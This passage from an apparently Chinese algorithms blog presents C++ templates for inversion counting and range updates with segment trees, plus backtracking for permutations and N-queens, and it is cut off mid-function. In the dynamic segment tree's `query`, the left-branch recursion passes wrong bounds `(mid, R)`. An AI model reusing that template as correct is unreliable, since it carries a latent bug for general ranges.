<span class="hljs-title class_">Tree</span><br>&#123;<br>    <span class="hljs-type">int</span> L[maxn &lt;&lt; <span class="hljs-number">2</span>], R[maxn &lt;&lt; <span class="hljs-number">2</span>], sum[maxn &lt;&lt; <span class="hljs-number">2</span>];<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushup</span><span class="hljs-params">(<span class="hljs-type">int</span> rt)</span> </span>&#123; sum[rt] = sum[ls] + sum[rs]; &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        L[rt] = l, R[rt] = r;<br>        <span class="hljs-keyword">if</span> (l == r)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">build</span>(ls, l, mid);<br>        <span class="hljs-built_in">build</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> pos)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (L[rt] == R[rt])<br>        &#123;<br>            sum[rt]++;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (pos &lt;= mid)<br>            <span class="hljs-built_in">add</span>(ls, pos);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">add</span>(rs, pos);<br>        <span class="hljs-built_in">pushup</span>(rt);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (l &gt; r)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (L[rt] == l &amp;&amp; R[rt] == r)<br>            <span class="hljs-keyword">return</span> sum[rt];<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (r &lt;= mid)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, r);<br>        <span class="hljs-keyword">if</span> (l &gt;= mid + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(rs, l, r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, mid) + <span class="hljs-built_in">query</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>    &#125;<br>&#125; T;<br><br><span class="hljs-type">int</span> a[maxn], b[maxn];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        cin &gt;&gt; a[i];<br>        b[i] = a[i];<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(b + <span class="hljs-number">1</span>, b + n + <span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> m = <span class="hljs-built_in">unique</span>(b + <span class="hljs-number">1</span>, b + n + <span class="hljs-number">1</span>) - b - <span class="hljs-number">1</span>;<br>    T.<span class="hljs-built_in">build</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, m);<br>    ll ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> pos = <span class="hljs-built_in">lower_bound</span>(b + <span class="hljs-number">1</span>, b + m + <span class="hljs-number">1</span>, a[i]) - b;<br>        ans += T.<span class="hljs-built_in">query</span>(<span class="hljs-number">1</span>, pos + <span class="hljs-number">1</span>, m);<br>        T.<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>, pos);<br>    &#125;<br>    cout &lt;&lt; ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="lazy标记线段树：https-loj-ac-p-132"><a href="#lazy标记线段树：https-loj-ac-p-132" class="headerlink" title="lazy标记线段树：https://loj.ac/p/132"></a>lazy标记线段树：<a href="https://loj.ac/p/132">https://loj.ac/p/132</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e6</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ls rt &lt;&lt; 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rs rt &lt;&lt; 1 | 1</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Tree</span><br>&#123;<br>    <span class="hljs-type">int</span> L[maxn &lt;&lt; <span class="hljs-number">2</span>], R[maxn &lt;&lt; <span class="hljs-number">2</span>];<br>    ll sum[maxn &lt;&lt; <span class="hljs-number">2</span>], lazy[maxn &lt;&lt; <span class="hljs-number">2</span>];<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushup</span><span class="hljs-params">(<span class="hljs-type">int</span> rt)</span> </span>&#123; sum[rt] = sum[ls] + sum[rs]; &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushdown</span><span class="hljs-params">(<span class="hljs-type">int</span> rt)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!lazy[rt])<br>            <span class="hljs-keyword">return</span>;<br>        lazy[ls] += lazy[rt];<br>        lazy[rs] += lazy[rt]; <span class="hljs-comment">//给子节点加lazy-tag</span><br>        sum[ls] += lazy[rt] * (R[ls] - L[ls] + <span class="hljs-number">1</span>);<br>        sum[rs] += lazy[rt] * (R[rs] - L[rs] + <span class="hljs-number">1</span>);<br>        lazy[rt] = <span class="hljs-number">0</span>; <span class="hljs-comment">//取消父结点的tag</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        L[rt] = l;<br>        R[rt] = r;<br>        <span class="hljs-keyword">if</span> (l == r)<br>        &#123;<br>            cin &gt;&gt; sum[rt];<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">build</span>(ls, l, mid);<br>        <span class="hljs-built_in">build</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-built_in">pushup</span>(rt);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (L[rt] == l &amp;&amp; R[rt] == r)<br>        &#123;<br>            lazy[rt] += val;<br>            sum[rt] += <span class="hljs-number">1LL</span> * val * (r - l + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">pushdown</span>(rt);<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (r &lt;= mid)<br>        &#123;<br>            <span class="hljs-built_in">add</span>(ls, l, r, val);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l &gt;= mid + <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-built_in">add</span>(rs, l, r, val);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">add</span>(ls, l, mid, val);<br>            <span class="hljs-built_in">add</span>(rs, mid + <span class="hljs-number">1</span>, r, val);<br>        &#125;<br>        <span class="hljs-built_in">pushup</span>(rt);<br>    &#125;<br><br>    <span class="hljs-function">ll <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (L[rt] == l &amp;&amp; R[rt] == r)<br>        &#123;<br>            <span class="hljs-keyword">return</span> sum[rt];<br>        &#125;<br>        <span class="hljs-built_in">pushdown</span>(rt);<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (r &lt;= mid)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, r);<br>        <span class="hljs-keyword">if</span> (l &gt;= mid + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(rs, l, r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, mid) + <span class="hljs-built_in">query</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>    &#125;<br>&#125; T;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    T.<span class="hljs-built_in">build</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> op, l, r;<br>        cin &gt;&gt; op &gt;&gt; l &gt;&gt; r;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> val;<br>            cin &gt;&gt; val;<br>            T.<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>, l, r, val);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>            cout &lt;&lt; T.<span class="hljs-built_in">query</span>(<span class="hljs-number">1</span>, l, r) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="动态开点线段树：https-www-luogu-com-cn-problem-P1908"><a href="#动态开点线段树：https-www-luogu-com-cn-problem-P1908" class="headerlink" title="动态开点线段树：https://www.luogu.com.cn/problem/P1908"></a>动态开点线段树：<a href="https://www.luogu.com.cn/problem/P1908">https://www.luogu.com.cn/problem/P1908</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e7</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Tree</span><br>&#123;<br>    <span class="hljs-type">int</span> cnt;<br>    <span class="hljs-type">int</span> ls[maxn], rs[maxn], sum[maxn];<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;rt, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> val, <span class="hljs-type">int</span> L = <span class="hljs-number">1</span>, <span class="hljs-type">int</span> R = <span class="hljs-number">1e9</span>)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!rt)<br>        &#123;<br>            rt = ++cnt;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (L == R)<br>        &#123;<br>            sum[rt] += val;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> mid = (L + R) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (pos &lt;= mid)<br>            <span class="hljs-built_in">add</span>(ls[rt], pos, val, L, mid);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">add</span>(rs[rt], pos, val, mid + <span class="hljs-number">1</span>, R);<br>        sum[rt] = sum[ls[rt]] + sum[rs[rt]];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> L = <span class="hljs-number">1</span>, <span class="hljs-type">int</span> R = <span class="hljs-number">1e9</span>)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!rt)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (l &gt; r)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (l == L &amp;&amp; r == R)<br>            <span class="hljs-keyword">return</span> sum[rt];<br>        <span class="hljs-type">int</span> mid = (L + R) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (r &lt;= mid)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls[rt], l, r, mid, R);<br>        <span class="hljs-keyword">if</span> (l &gt;= mid + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(rs[rt], l, r, mid + <span class="hljs-number">1</span>, R);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls[rt], l, mid, L, mid) +<br>               <span class="hljs-built_in">query</span>(rs[rt], mid + <span class="hljs-number">1</span>, r, mid + <span class="hljs-number">1</span>, R);<br>    &#125;<br>&#125; T;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br>    ll ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> rt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin &gt;&gt; x;<br>        ans += T.<span class="hljs-built_in">query</span>(rt, x + <span class="hljs-number">1</span>, <span class="hljs-number">1e9</span>);<br>        T.<span class="hljs-built_in">add</span>(rt, x, <span class="hljs-number">1</span>);<br>    &#125;<br>    cout &lt;&lt; ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>全排列：1-n全排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c+">#include &lt;bits/stdc++.h&gt;<br>using namespace std;<br><br>const int N = 1000;<br>int n, path[N];<br>bool flag[N]; //path[N]用来存方案<br><br>void dfs(int u)<br>&#123;<br>    if (u == n)<br>    &#123; //怎么确定叶子结点：最后一层，叶子结点<br>        for (int i = 0; i &lt;= n - 1; i++)<br>        &#123;<br>            cout &lt;&lt; path[i] &lt;&lt; &quot; &quot;;<br>        &#125;<br>        cout &lt;&lt; endl;<br>        return;<br>    &#125;<br>    for (int i = 1; i &lt;= n; i++)<br>    &#123;<br>        if (!flag[i])<br>        &#123;<br>            path[u] = i;<br>            flag[i] = 1;<br>            dfs(u + 1);  //当dfs结束的时候，意味着我们所有的路都走完了，准备回溯<br>            flag[i] = 0; //恢复现场<br>        &#125;<br>    &#125;<br>&#125;<br><br>void Main()<br>&#123;<br>    cin &gt;&gt; n;<br>    dfs(0);<br>&#125;<br><br>int main()<br>&#123;<br>    ios::sync_with_stdio(false);<br>    cin.tie(NULL);<br>    cout.tie(NULL);<br>    Main();<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="N皇后：-P1219-USACO1-5-八皇后-Checker-Challenge-洛谷-计算机科学教育新生态-luogu-com-cn"><a href="#N皇后：-P1219-USACO1-5-八皇后-Checker-Challenge-洛谷-计算机科学教育新生态-luogu-com-cn" class="headerlink" title="N皇后：[P1219 USACO1.5]八皇后 Checker Challenge - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)"></a>N皇后：[P1219 <a href="https://www.luogu.com.cn/problem/P1219">USACO1.5]八皇后 Checker Challenge - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> n, path[<span class="hljs-number">15</span>], sum = <span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> col[<span class="hljs-number">30</span>], dg[<span class="hljs-number">30</span>], udg[<span class="hljs-number">30</span>]; <span class="hljs-comment">//同一列，正反对角线各开一个</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> line)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (line == n + <span class="hljs-number">1</span>)<br>    &#123;<br>        sum++;<br>        <span class="hljs-keyword">if</span> (sum &gt; <span class="hljs-number">3</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>            &#123;<br>                cout &lt;&lt; path[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>            &#125;<br>            cout &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!col[i] &amp;&amp; !dg[line + i] &amp;&amp; !udg[line - i + n])<br>        &#123; <span class="hljs-comment">//剪枝</span><br>            path[line] = i;<br>            col[i] = dg[line + i] = udg[line - i + n] = <span class="hljs-number">1</span>; <span class="hljs-comment">//占对角线</span><br>            <span class="hljs-built_in">dfs</span>(line + <span class="hljs-number">1</span>);<br>            col[i] = dg[line + i] = udg[line - i + n] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br>    cout &lt;&lt; sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="数的分解"><a href="#数的分解" class="headerlink" title="数的分解"></a>数的分解</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, k;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> Max, <span class="hljs-type">int</span> 